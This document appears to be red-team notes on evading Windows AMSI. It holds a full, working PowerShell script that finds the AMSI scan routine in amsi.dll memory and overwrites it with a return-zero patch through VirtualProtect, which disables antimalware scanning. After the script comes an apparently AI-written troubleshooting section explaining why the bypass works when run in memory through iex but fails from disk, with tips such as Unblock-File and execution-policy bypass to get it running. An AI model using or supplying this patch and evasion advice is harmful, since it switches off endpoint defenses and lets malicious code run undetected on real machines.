### TO DO:
- https://github.com/V-i-x-x/AMSI-BYPASS/
- https://www.offsec.com/blog/amsi-write-raid-0day-vulnerability/
- https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/

## Powershell

- from https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass
```powershell
Write-Host "-- AMSI Patch"
Write-Host "-- Modified By: Shantanu Khandelwal (@shantanukhande)"
Write-Host "-- Original Author: Paul Laîné (@am0nsec)"
Write-Host ""

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    # Return the address of the function
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TypeBuilder.CreateType()
}
$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VistualProtectDelegate =  Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ([IntPtr]::Size -eq 8) {
    Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
    Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}


$hModule = $LoadLibrary.Invoke("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
```



The difference in behavior between running the script with `iex` (Invoke-Expression) and running it directly in a PowerShell terminal is likely due to how the **Antimalware Scan Interface (AMSI)** and PowerShell execution policies interact with scripts.

### **Why the Script Works with `iex` but Fails When Run Directly**

1. **AMSI Detection:**
   - **AMSI** is a security feature that scans scripts and code running in PowerShell to detect and block malicious activity. When you use `iex` to download and execute the script from memory, it can sometimes bypass AMSI detection because the script may be obfuscated or executed in a way that temporarily evades the scan.
   - However, when you run the script directly by right-clicking and selecting "Run with PowerShell," the script is read from disk and passed through AMSI, which might detect and block it.

2. **Script Execution Policy:**
   - PowerShell’s **execution policies** control the conditions under which PowerShell loads configuration files and runs scripts.
   - If your script is downloaded from the internet, it might be marked as "blocked" by Windows. When you right-click and run it, PowerShell may enforce the execution policy or AMSI check more strictly.
   - The script may also be subject to **Zone Identifier metadata**, which marks the script as having been downloaded from the web, triggering additional security checks.

### **Solutions and Workarounds**

1. **Unblock the Script:**
   - If the script was downloaded from the internet, it might be blocked by Windows. You can unblock it using the following command:
     ```powershell
     Unblock-File -Path "C:\path\to\your\script.ps1"
     ```
   - This removes the Zone Identifier metadata and might prevent AMSI from blocking it when run directly.

2. **Execution Policy Consideration:**
   - Check the current execution policy using:
     ```powershell
     Get-ExecutionPolicy
     ```
   - If the policy is too restrictive (e.g., `AllSigned` or `Restricted`), you may want to temporarily change it to allow script execution:
     ```powershell
     Set-ExecutionPolicy Bypass -Scope Process
     ```
   - This will allow the script to run without changing the policy for the entire system.

3. **AMSI Bypass Techniques:**
   - AMSI bypass techniques often rely on obfuscation or exploiting specific behavior in PowerShell. These might work differently depending on how the script is executed (from memory vs. from disk).
   - If the bypass fails when the script is run directly, it could be due to AMSI detecting a signature within the script that’s more apparent when read from disk.

### **Testing and Debugging**

- **Verbose Output**: Run the script with verbose output to get more details about what’s failing:
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -File "C:\path\to\your\script.ps1" -Verbose
  ```

- **Log and Monitor**: Use logging or monitoring tools to see where the script might be getting blocked. The Windows Event Viewer or a PowerShell transcript might provide more insight.

### **Summary**
- **AMSI** may detect and block the script when it’s run directly from disk due to more stringent scanning.
- **Execution Policy** or **Zone Identifier** metadata might be preventing the script from running as expected.
- Try **unblocking the script** or **adjusting the execution policy** temporarily to see if it resolves the issue.
